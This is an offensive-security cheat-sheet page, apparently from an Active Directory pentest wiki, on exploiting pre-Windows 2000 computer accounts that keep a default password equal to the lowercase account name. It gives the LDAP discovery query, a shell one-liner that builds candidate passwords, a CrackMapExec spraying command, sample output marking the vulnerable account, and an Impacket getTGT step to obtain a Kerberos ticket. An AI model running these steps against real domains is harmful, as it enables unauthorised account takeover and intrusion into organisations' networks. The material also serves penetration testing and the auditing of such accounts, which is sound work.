**Pre-Windows 2000 computers** — when a computer account is created with "Assign this computer account as a pre-Windows 2000 computer" checked, it gets a default password: the lowercase account name without the trailing `$` (e.g. `FOOBAR$` -> `foobar`). It is reset to a random value on first logon, so only never-used accounts are exploitable.

## Discovery

LDAP query (see [LDAP Recon](LDAP%20Recon.md)) for never-logged-on workstation trust accounts with no password required:

```

"(&(userAccountControl=4128)(logonCount=0))" "sAMAccountName"

```

**Note:** `4128` combines `WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`.

## Exploitation

A non-empty result means there are never-used computer accounts (not necessarily pre-2000, but worth testing).

1. Save the accounts to `USER_FILE`.
2. Build the candidate password list (lowercase, strip `$`):

```bash

cat 'USER_FILE' | tr '[:upper:]' '[:lower:]' | sed 's/\$//g' | tee 'PASS_FILE'

```

3. Run a LOGIN=PASS attack (or use [Domain Password Spraying](Domain%20Password%20Spraying.md)):

```bash

cme smb 'DC_IP' -u 'USER_FILE' -p 'PASS_FILE' --no-bruteforce --continue-on-success

```

4. Look for the status `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` - that account is vulnerable.

```console

SMB  DC_IP  445  DC01  [-] domain.local\DUMMY-COMPUTER$:dummy-computer  STATUS_LOGON_FAILURE
SMB  DC_IP  445  DC01  [-] domain.local\PRE2000$:pre2000  STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT

```

5. Request a TGT (avoids the mandatory password change that NTLM auth would trigger):

```bash

getTGT.py 'DOMAIN/COMPUTER_NAME$:COMPUTER_PASS' -dc-ip 'DC_IP'
export KRB5CCNAME=COMPUTER_NAME\$.ccache
cme smb dc01.domain.local --kerberos

```

## Caution

This is a password-bruteforce attack, so it generates logon events on the DC.

## References

- TrustedSec - Diving into pre-created computer accounts - https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/
